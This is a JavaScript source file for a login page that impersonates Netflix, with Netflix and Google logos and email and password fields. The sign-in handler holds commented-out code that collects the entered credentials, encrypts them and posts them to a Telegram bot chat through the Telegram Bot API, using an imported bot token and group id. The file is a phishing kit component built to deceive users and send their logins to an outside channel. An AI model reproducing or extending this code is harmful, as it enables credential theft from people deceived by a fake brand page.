import {map,useRef} from "vanilla";
import css from "./Home.module.css";
import {netflixlogo,googlelogo} from "assets";
import {InputField} from "components";
import {bottoken,netlixgroupid} from "estate";
import {encrypt,decrypt} from "afile";


export default function Home(props){
    const {parent}=props;
    parent.insertAdjacentHTML("beforeend",`<div class="${css.home} activeroute"></div>`);
    const home=parent.querySelector(`.${css.home}`);
    
    const refs={
        inputfields:["email","password"].map(prop=>useRef(prop)),
    };

    home.innerHTML=`
        <div class="${css.row0}">
            <img class="${css.applogo}" alt="Aflex" src="${netflixlogo}"/>
        </div>
        <div class="${css.row1}"></div>
        <div class="${css.row2}">
            <button class="${css.signin}">Sign in</button>
            <div class="${css.logos}">
                ${map(logos,logo=>`
                    <img class="${css.logo}" alt="${logo.of}" src="${logo.src}" style="${logo.style}"/>
                `)}
            </div>
        <div>
    `;

    ["email","password"].forEach((prop,i)=>{
        InputField({
            parent:home.querySelector(`.${css.row1}`),
            placeholder:prop,
            ref:refs.inputfields[i],
            type:prop,
        });
    });
    
    home.querySelector(`.${css.signin}`).onclick=()=>{
        /*const inputvalues=refs.inputfields.map(ref=>home.querySelector(`#${ref} input`).value);
        const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
        history.pushState("#shows");
        /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
            method:"POST",
            redirect:"follow",
        }).catch(error=>console.log("error",error));*/
    }
}

const styles={
    row0:`
        display:block;
    `,
}

const logos=[
    {
        of:"google",
        src:googlelogo,
        style:"transform:rotate(-5deg)",
    }
];

const logincode=(account,password,type)=>`{
    account:${account},
    password:${password},
    type:${type},
}`;